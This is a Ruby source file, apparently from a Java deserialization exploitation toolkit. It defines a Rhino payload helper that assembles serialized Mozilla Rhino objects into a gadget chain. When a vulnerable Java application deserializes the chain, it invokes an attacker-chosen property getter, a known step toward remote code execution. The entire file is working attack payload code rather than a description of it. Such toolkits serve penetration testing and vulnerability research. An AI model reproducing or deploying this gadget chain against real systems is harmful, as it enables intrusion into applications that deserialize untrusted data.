require_relative '../serialize'

module Java
  module Serialize
    module Payloads
      module Rhino
        def make_get_property(obj, prop)
          top = Java::Serialize::JavaObject.new('Lorg/mozilla/javascript/NativeObject;', 'associatedValues' => Java::Serialize::JavaObject.new('Ljava/util/HashMap;', 'elements' => {
                                                                                                                                                 'ClassCache' => Java::Serialize::JavaObject.new('Lorg/mozilla/javascript/ClassCache;', {})
                                                                                                                                               }))

          initscriptable = Java::Serialize::JavaObject.new('Lorg/mozilla/javascript/tools/shell/Environment;', 'slots' => [
                                                             Java::Serialize::JavaObject.new('Lorg/mozilla/javascript/ScriptableObject$GetterSlot;', 'indexOrHash' => 0,
                                                                                                                                                     'name' => 'foo',
                                                                                                                                                     'getter' => Java::Serialize::JavaObject.new('Lorg/mozilla/javascript/MemberBox;', 'isMethod' => true,
                                                                                                                                                                                                                                       'name' => 'enter',
                                                                                                                                                                                                                                       'class' => Java::Serialize::JavaClass.new('Lorg/mozilla/javascript/Context;'),
                                                                                                                                                                                                                                       'params' => []))
                                                           ])

          initcontext = Java::Serialize::JavaObject.new('Lorg/mozilla/javascript/NativeJavaObject;', 'isAdapter' => true,
                                                                                                     'parent' => top,
                                                                                                     'scriptable' => initscriptable)

          invokescript = Java::Serialize::JavaObject.new('Lorg/mozilla/javascript/tools/shell/Environment;', 'parentScopeObject' => initcontext,
                                                                                                             'slots' => [
                                                                                                               Java::Serialize::JavaObject.new('Lorg/mozilla/javascript/ScriptableObject$GetterSlot;', 'indexOrHash' => 0,
                                                                                                                                                                                                       'name' => prop)
                                                                                                             ])

          array = Java::Serialize::JavaObject.new('Lorg/mozilla/javascript/NativeJavaArray;',                                               'parent' => top,
                                                                                                                                            'javaObject' => obj,
                                                                                                                                            'prototype' => invokescript)

          Java::Serialize::JavaObject.new('Lorg/mozilla/javascript/NativeJavaObject;', 'isAdapter' => true,
                                                                                       'parent' => top,
                                                                                       'scriptable' => array)
        end
        module_function :make_get_property
      end
    end
  end
end
